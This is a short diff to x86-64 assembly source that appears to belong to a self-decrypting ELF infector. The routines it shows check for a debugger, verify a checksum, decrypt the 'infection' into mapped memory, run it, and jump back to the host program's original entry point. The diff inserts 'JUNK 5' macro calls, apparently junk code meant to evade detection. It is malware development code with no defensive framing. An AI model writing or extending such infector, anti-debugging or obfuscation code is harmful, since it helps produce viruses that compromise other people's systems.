@@ -54,6 +54,7 @@ _start:
 	call _checkdbg_by_status_file
 	cmp rax, 0
 	jne _check_alternate_start
+	JUNK 5
 
 _verify_checksum:
 	lea rdi, [rel _text_section_vaddr]
@@ -175,6 +176,7 @@ _decrypt_infection:
 	add r10, r11 ; take unencrypted_part_size
 ;	add rax, 256 ; now we add 256 to our key addr, to go on _decrypt
 	call _decrypt ; and we call _decrypt
+	JUNK 5
 
 ; Now we move our decrypter on our mmap directly after decrypted part + 256 (key_size)
 	mov rdi, QWORD [rsp] ; take mmap addr
@@ -198,6 +200,7 @@ _decrypt_infection:
 ; Now, we have our decrypted part on our mmap, we need to call it, so:
 ; We take our unencrypted part size, and add it to our mmap_base_addr to go to our
 ; desencrypted part, and we jump in.
+	JUNK 5
 	lea r10, [rel _o_entry] ; take _o_entry_addr 
 	lea r11, [rel _encrypted_part_start] ; take _encrypted_part_addr
 	sub r11, r10 ; take our unencrypted part size
@@ -219,6 +222,7 @@ _force_exit:
 
 ;; Jump back to old entry point
 _jmp_to_o_entry: 
+	JUNK 5
 	;; Pop off the stack all the registers saved at the begining of the program
 	pop		r15
 	pop		r14
